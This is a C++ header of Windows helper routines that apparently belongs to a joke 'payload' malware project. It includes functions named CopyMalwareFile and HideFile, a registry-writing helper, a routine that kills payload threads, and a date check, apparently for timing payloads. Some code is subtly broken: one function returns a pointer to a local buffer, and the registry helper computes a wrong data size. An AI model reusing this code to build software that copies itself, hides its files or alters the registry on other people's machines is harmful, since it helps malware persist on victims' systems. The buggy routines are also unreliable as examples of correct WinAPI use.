typedef struct IUnknown IUnknown;

#pragma once

#include "Lixo.h"

namespace System
{
	//Refresh the screen to clean all decals.
	VOID RedrawScreen(VOID)
	{
		RedrawWindow(NULL, NULL, NULL, RDW_INVALIDATE | RDW_ERASE | RDW_ALLCHILDREN);
	}

	//Do I need explain this?
	VOID EndPayload(HANDLE hPayload, HANDLE hPML)
	{
		TerminateThread(hPayload, NULL);
		CloseHandle(hPayload);
		HeapDestroy(hPML);
	}

	//Set a regedit value or creates it if doesn't exists.
	VOID SetRegValue(HKEY hKey, LPCWSTR lpSubKey, LPCWSTR lpValueName, DWORD dwType, LPBYTE lpData, DWORD cbData) 
	{
		HKEY phkResult;

		RegOpenKeyExW(hKey, lpSubKey, NULL, KEY_SET_VALUE, &phkResult);
		RegSetValueExW(phkResult, lpValueName, NULL, dwType, lpData, sizeof(lpData) * cbData);
		RegCloseKey(phkResult);
	}

	//Get the current path where the program was executed (includes .exe)
	LPCWSTR GetCurrentFileDir() 
	{
		WCHAR buffer[MAX_PATH];
		GetModuleFileName(NULL, buffer, MAX_PATH);

		return (LPCWSTR)buffer;
	}

	//Idk why I created this while I could just use CopyFileW lol
	VOID CopyMalwareFile(LPCWSTR orgPathFile, WCHAR dstPathFile[]) 
	{
		CopyFileW(orgPathFile, dstPathFile, TRUE);
	}

	//Makes the file disappear like your dad!
	VOID HideFile(LPCWSTR orgPathFile) 
	{
		SetFileAttributesW(orgPathFile, FILE_ATTRIBUTE_HIDDEN);
	}

	//Returns a date element (day, month, year)
	INT CheckDate(INT i) 
	{
		time_t t = time(0);
		tm date = *localtime(&t);

		if (i == 0) i = date.tm_mday; //1-31
		if (i == 1) i = date.tm_mon;  //0-11
		if (i == 2) i = date.tm_year; //XXXX

		//Actually the return value for the year is
		//The year of the system - 1900. 

		return i;
	}
}
